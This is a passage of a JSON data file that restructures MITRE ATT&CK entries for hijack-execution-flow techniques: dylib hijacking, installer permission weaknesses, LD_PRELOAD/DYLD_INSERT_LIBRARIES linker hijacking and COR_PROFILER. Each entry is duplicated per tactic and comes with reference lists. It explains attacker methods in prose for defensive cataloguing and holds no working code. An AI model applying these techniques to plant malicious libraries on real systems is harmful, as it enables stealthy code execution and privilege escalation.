        "url": "https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py",
        "description": "Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--fc742192-19e3-466c-9eb5-964a97b29490",
    "platform": "macos",
    "tid": "T1574.004",
    "technique": "Dylib Hijacking",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)",
    "technique_references": [
      {
        "source_name": "MalwareUnicorn macOS Dylib Injection MachO",
        "url": "https://malwareunicorn.org/workshops/macos_dylib_injection.html#5",
        "description": "Amanda Rousseau. (2020, April 4). MacOS Dylib Injection Workshop. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Developer Doco Archive Run-Path",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/RunpathDependentLibraries.html",
        "description": "Apple Inc.. (2012, July 7). Run-Path Dependent Libraries. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijacking OSX 2015",
        "url": "https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf",
        "description": "Patrick Wardle. (2015, March 1). Dylib Hijacking on OS X. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Writing Bad Malware for OSX",
        "url": "https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf",
        "description": "Patrick Wardle. (2015). Writing Bad @$$ Malware for OS X. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Wardle Dylib Hijack Vulnerable Apps",
        "url": "https://objective-see.com/blog/blog_0x46.html",
        "description": "Patrick Wardle. (2019, July 2). Getting Root with Benign AppStore Apps. Retrieved March 31, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "wardle artofmalware volume1",
        "url": "https://taomm.org/vol1/pdfs.html",
        "description": "Patrick Wardle. (2020, August 5). The Art of Mac Malware Volume 0x1: Analysis. Retrieved March 19, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject HijackScanner",
        "url": "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py",
        "description": "Wardle, P., Ross, C. (2017, September 21). Empire Project Dylib Hijack Vulnerability Scanner. Retrieved April 1, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Github EmpireProject CreateHijacker Dylib",
        "url": "https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py",
        "description": "Wardle, P., Ross, C. (2018, April 8). EmpireProject Create Dylib Hijacker. Retrieved April 1, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
    "platform": "windows",
    "tid": "T1574.005",
    "technique": "Executable Installer File Permissions Weakness",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "technique_references": [
      {
        "source_name": "mozilla_sec_adv_2012",
        "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
        "description": "Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Executable Installers are Vulnerable",
        "url": "https://seclists.org/fulldisclosure/2015/Dec/34",
        "description": "Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "administrator|user|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
    "platform": "windows",
    "tid": "T1574.005",
    "technique": "Executable Installer File Permissions Weakness",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "technique_references": [
      {
        "source_name": "mozilla_sec_adv_2012",
        "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
        "description": "Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Executable Installers are Vulnerable",
        "url": "https://seclists.org/fulldisclosure/2015/Dec/34",
        "description": "Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "administrator|user|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--70d81154-b187-45f9-8ec5-295d01255979",
    "platform": "windows",
    "tid": "T1574.005",
    "technique": "Executable Installer File Permissions Weakness",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "technique_references": [
      {
        "source_name": "mozilla_sec_adv_2012",
        "url": "https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/",
        "description": "Robert Kugler. (2012, November 20). Mozilla Foundation Security Advisory 2012-98. Retrieved March 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Executable Installers are Vulnerable",
        "url": "https://seclists.org/fulldisclosure/2015/Dec/34",
        "description": "Stefan Kanthak. (2015, December 8). Executable installers are vulnerable^WEVIL (case 7): 7z*.exe allows remote code execution with escalation of privilege. Retrieved December 4, 2014.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user",
    "technique_effective_permissions": "administrator|user|system",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
    "platform": "linux|macos",
    "tid": "T1574.006",
    "technique": "Dynamic Linker Hijacking",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ",
    "technique_references": [
      {
        "source_name": "Man LD.SO",
        "url": "https://www.man7.org/linux/man-pages/man8/ld.so.8.html",
        "description": "Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TLDP Shared Libraries",
        "url": "https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html",
        "description": "The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Doco Archive Dynamic Libraries",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html",
        "description": "Apple Inc.. (2012, July 23). Overview of Dynamic Libraries. Retrieved March 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Baeldung LD_PRELOAD",
        "url": "https://www.baeldung.com/linux/ld_preload-trick-what-is",
        "description": "baeldung. (2020, August 9). What Is the LD_PRELOAD Trick?. Retrieved March 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Code Injection on Linux and macOS",
        "url": "https://www.datawire.io/code-injection-on-linux-and-macos/",
        "description": "Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Phrack halfdead 1997",
        "url": "http://phrack.org/issues/51/8.html",
        "description": "halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Brown Exploiting Linkers",
        "url": "http://www.nth-dimension.org.uk/pub/BTL.pdf",
        "description": "Tim Brown. (2011, June 29). Breaking the links: Exploiting the linker. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "TheEvilBit DYLD_INSERT_LIBRARIES",
        "url": "https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/",
        "description": "Fitzl, C. (2019, July 9). DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Timac DYLD_INSERT_LIBRARIES",
        "url": "https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/",
        "description": "Timac. (2012, December 18). Simple code injection using DYLD_INSERT_LIBRARIES. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass",
        "url": "https://jon-gabilondo-angulo-7635.medium.com/how-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191",
        "description": "Jon Gabilondo. (2019, September 22). How to Inject Code into Mach-O Apps. Part II.. Retrieved March 24, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
    "platform": "linux|macos",
    "tid": "T1574.006",
    "technique": "Dynamic Linker Hijacking",
    "tactic": "privilege-escalation",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ",
    "technique_references": [
      {
        "source_name": "Man LD.SO",
        "url": "https://www.man7.org/linux/man-pages/man8/ld.so.8.html",
        "description": "Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TLDP Shared Libraries",
        "url": "https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html",
        "description": "The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Doco Archive Dynamic Libraries",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html",
        "description": "Apple Inc.. (2012, July 23). Overview of Dynamic Libraries. Retrieved March 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Baeldung LD_PRELOAD",
        "url": "https://www.baeldung.com/linux/ld_preload-trick-what-is",
        "description": "baeldung. (2020, August 9). What Is the LD_PRELOAD Trick?. Retrieved March 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Code Injection on Linux and macOS",
        "url": "https://www.datawire.io/code-injection-on-linux-and-macos/",
        "description": "Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Phrack halfdead 1997",
        "url": "http://phrack.org/issues/51/8.html",
        "description": "halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Brown Exploiting Linkers",
        "url": "http://www.nth-dimension.org.uk/pub/BTL.pdf",
        "description": "Tim Brown. (2011, June 29). Breaking the links: Exploiting the linker. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "TheEvilBit DYLD_INSERT_LIBRARIES",
        "url": "https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/",
        "description": "Fitzl, C. (2019, July 9). DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Timac DYLD_INSERT_LIBRARIES",
        "url": "https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/",
        "description": "Timac. (2012, December 18). Simple code injection using DYLD_INSERT_LIBRARIES. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass",
        "url": "https://jon-gabilondo-angulo-7635.medium.com/how-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191",
        "description": "Jon Gabilondo. (2019, September 22). How to Inject Code into Mach-O Apps. Part II.. Retrieved March 24, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--633a100c-b2c9-41bf-9be5-905c1b16c825",
    "platform": "linux|macos",
    "tid": "T1574.006",
    "technique": "Dynamic Linker Hijacking",
    "tactic": "defense-evasion",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ",
    "technique_references": [
      {
        "source_name": "Man LD.SO",
        "url": "https://www.man7.org/linux/man-pages/man8/ld.so.8.html",
        "description": "Kerrisk, M. (2020, June 13). Linux Programmer's Manual. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "TLDP Shared Libraries",
        "url": "https://www.tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html",
        "description": "The Linux Documentation Project. (n.d.). Shared Libraries. Retrieved January 31, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Apple Doco Archive Dynamic Libraries",
        "url": "https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html",
        "description": "Apple Inc.. (2012, July 23). Overview of Dynamic Libraries. Retrieved March 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Baeldung LD_PRELOAD",
        "url": "https://www.baeldung.com/linux/ld_preload-trick-what-is",
        "description": "baeldung. (2020, August 9). What Is the LD_PRELOAD Trick?. Retrieved March 24, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Code Injection on Linux and macOS",
        "url": "https://www.datawire.io/code-injection-on-linux-and-macos/",
        "description": "Itamar Turner-Trauring. (2017, April 18). “This will only hurt for a moment”: code injection on Linux and macOS with LD_PRELOAD. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Phrack halfdead 1997",
        "url": "http://phrack.org/issues/51/8.html",
        "description": "halflife. (1997, September 1). Shared Library Redirection Techniques. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Brown Exploiting Linkers",
        "url": "http://www.nth-dimension.org.uk/pub/BTL.pdf",
        "description": "Tim Brown. (2011, June 29). Breaking the links: Exploiting the linker. Retrieved March 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "TheEvilBit DYLD_INSERT_LIBRARIES",
        "url": "https://theevilbit.github.io/posts/dyld_insert_libraries_dylib_injection_in_macos_osx_deep_dive/",
        "description": "Fitzl, C. (2019, July 9). DYLD_INSERT_LIBRARIES DYLIB injection in macOS / OSX. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Timac DYLD_INSERT_LIBRARIES",
        "url": "https://blog.timac.org/2012/1218-simple-code-injection-using-dyld_insert_libraries/",
        "description": "Timac. (2012, December 18). Simple code injection using DYLD_INSERT_LIBRARIES. Retrieved March 26, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass",
        "url": "https://jon-gabilondo-angulo-7635.medium.com/how-to-inject-code-into-mach-o-apps-part-ii-ddb13ebc8191",
        "description": "Jon Gabilondo. (2019, September 22). How to Inject Code into Mach-O Apps. Part II.. Retrieved March 24, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335",
    "platform": "windows",
    "tid": "T1574.012",
    "technique": "COR_PROFILER",
    "tactic": "persistence",
    "datasources": "module-load",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013)\n\nThe COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013)\n\nAdversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account 